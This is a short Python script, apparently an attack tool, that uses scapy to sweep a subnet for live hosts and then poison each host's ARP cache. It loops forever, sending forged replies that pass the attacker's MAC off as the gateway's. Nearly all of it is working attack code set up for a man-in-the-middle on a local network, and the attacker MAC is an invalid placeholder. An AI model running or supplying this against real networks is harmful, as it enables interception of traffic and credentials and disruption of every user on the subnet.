
from scapy.all import ARP, Ether, srp, sendp
import time

target_subnet = "192.168.101.0/24" 
attacker_ip = "192.168.104.225"  
attacker_mac = "ab:cd:ef:gh:ij:kl"  
gateway_ip = "192.168.96.1"  

ip_to_mac = {}
def arp_sweep(subnet):
    print(f"Starting ARP sweep on subnet {subnet}...")
    arp_request = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        ip_to_mac[received.psrc] = received.hwsrc
        print(f"IP: {received.psrc} - MAC: {received.hwsrc}")

def arp_poison(ip_to_mac, gateway_ip, attacker_ip, attacker_mac):
    print("Starting ARP poisoning...")
    while True:
        for ip, mac in ip_to_mac.items():
            ether=Ether(src=attacker_mac,dst=mac)
            arp_response = ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac, pdst=ip, hwdst=mac)
            packet = ether / arp_response
            sendp(packet, verbose=False)
            print(f"Sent ARP reply to {ip} to poison its ARP cache.")
        time.sleep(1)

arp_sweep(target_subnet)

time.sleep(2)

arp_poison(ip_to_mac, gateway_ip, attacker_ip, attacker_mac)
